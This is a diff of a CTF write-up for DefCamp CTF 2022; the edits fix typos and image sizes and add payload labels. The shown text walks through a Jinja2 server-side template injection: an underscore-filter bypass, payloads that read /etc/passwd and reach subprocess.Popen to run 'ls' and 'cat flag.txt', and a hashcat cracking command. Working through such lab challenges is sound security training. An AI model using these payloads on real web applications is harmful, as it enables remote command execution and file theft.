@@ -11,7 +11,7 @@ description: CTF - DefCamp CTF 2022
 # DefCamp CTF 2022
 
 <p align="center">
-  <img src="/images/writeups/DiceCTF2022/logo.png" width="50%"/>
+  <img src="/images/writeups/DefCamp2022/logo.png" width="50%"/>
 </p>
 
 Welcome! I've participated in this CTF with team [ISwearIGoogledIt](https://ctftime.org/team/109689) and got some challenges! 
@@ -142,7 +142,7 @@ if (False) {
 ?>
 ```
 
-So we cannot bypass the 4 chars for the input, so I looked for 2 chars commands and fount [this page](https://www.davekb.com/browse_computer_tips:linux_two_letter_commands:txt)
+So we cannot bypass the 4 chars for the input, so I looked for 2 chars commands and fount [this page](https://www.davekb.com/browse_computer_tips:linux_two_letter_commands:txt).
 
 We can bypass the filter with \\ or '', but we ran out of characters for the wildcard input:
 
@@ -189,25 +189,26 @@ When visiting the website, we can see the following traceback error:
 We can see that it will be an SSTI (Server Side Template Injection) vulnerability. To send the data, we saw that the errors were printing 'HTTP' and 'GET' is undefinded, so used telnet to send the raw data and worked without any of the HTTP methods or syntax:
 
 <p align="center">
-  <img src="/images/writeups/DefCamp2022/Misc/2_0_seepng" width="80%"/>
+  <img src="/images/writeups/DefCamp2022/Misc/2_0_see.png" width="80%"/>
 </p>
 
 Sending ```7*7``` returns 49 so we can confirm the SSTI:
 
 <p align="center">
-  <img src="/images/writeups/DefCamp2022/Misc/2_1_77.png" width="80%"/>
+  <img src="/images/writeups/DefCamp2022/Misc/2_1_77.png" width="70%"/>
 </p>
 
 Now, the first thing is to understand the process within the server. We were getting errors with the following payloads:
 
 ```python
-
+# Payload
 7*'7'
 '''
 7777777
 Connection closed by foreign host.
 '''
 
+# Payload 2
 ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
 '''
 Traceback (most recent call last):
@@ -224,6 +225,7 @@ jinja2.exceptions.UndefinedError: 'str object' has no attribute 'class'
 Connection closed by foreign host.
 '''
 
+# Payload 3
 [].class.base.subclasses()
 '''
 Traceback (most recent call last):
@@ -240,6 +242,7 @@ jinja2.exceptions.UndefinedError: 'list object' has no attribute 'class'
 Connection closed by foreign host.
 '''
 
+# Payload 4
 len(''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read())
 # Errors...
 ```
@@ -247,18 +250,21 @@ len(''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read())
 Then we realized that payloads were correct, but there must be some filtering undergoing in the server, the following payload confirmed the idea:
 
 ```python
+# Payload 5 
 '__name__'
 '''
 name
 Connection closed by foreign host.
 '''
 
+# Payload 6
 "name"
 '''
 
 Connection closed by foreign host.
-'''                                                                                                                                                                                    
+'''
 
+# Payload 7
 "__name__"
 '''
 
@@ -269,6 +275,7 @@ Connection closed by foreign host.
 So the main filter is the underscore (\_) as far as we know. Therefore, we used some [bypasses](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f) and we can see that it was successful. In this case, we used class and MRO (Method Resolution Order) to list the classes being inherited from:
 
 ```python
+# Payload 8
 ''|attr('application')|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')
 '''
 (<class 'jinja2.runtime.Undefined'>, <class 'object'>)
@@ -279,7 +286,7 @@ Connection closed by foreign host.
 As paylaod worked, it was time to list methods from the object class and try to spot a method that might allow us to execute commands such as **os**, **sys** or **subprocess**. In this case, we can use the base from class to list the subclasses imported by this item.
 
 ```python
-
+# Payload 9
 ()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()
 
 '''
@@ -293,6 +300,7 @@ We spotted **subprocess.Popen** at position 192, so next step is to craft the pa
 
 
 ```python
+# Payload 10
 ()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(192)('ls')|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')
 '''
 flag.txt  server.py
@@ -313,12 +321,13 @@ Connection closed by foreign host.
 ```
 
 <p align="center">
-  <img src="/images/writeups/DefCamp2022/Misc/2_2_ls.png" width="80%"/>
+  <img src="/images/writeups/DefCamp2022/Misc/2_2_ls.png" width="100%"/>
 </p>
 
-With ls we listthe directory and spotted **flag.txt** file. Let's dump its content:
+With **ls** we listthe directory and spotted **flag.txt** file. Let's dump its content:
 
 ```python
+# Final payload
 ()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(192)('cat flag.txt',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')
 
 '''
@@ -329,7 +338,7 @@ CTF{3497acdc5cdb795851f334a6c8f401a1e2504b4d05283b6b599e7b6dc42cc200}
 And the flag is printed:
 
 <p align="center">
-  <img src="/images/writeups/DefCamp2022/Misc/2_3_flag.png" width="80%"/>
+  <img src="/images/writeups/DefCamp2022/Misc/2_3_flag.png" width="70%"/>
 </p>
 
 ``` CTF{3497acdc5cdb795851f334a6c8f401a1e2504b4d05283b6b599e7b6dc42cc200} ```
@@ -447,7 +456,7 @@ hashcat -m 11600 power.hash /usr/share/wordlists/rockyou.txt
 ```
 
 <p align="center">
-  <img src="/images/writeups/DefCamp2022/Forensic/3_1_hash.png" width="90%"/>
+  <img src="/images/writeups/DefCamp2022/Forensic/3_1_hash.png" width="100%"/>
 </p>
 
 
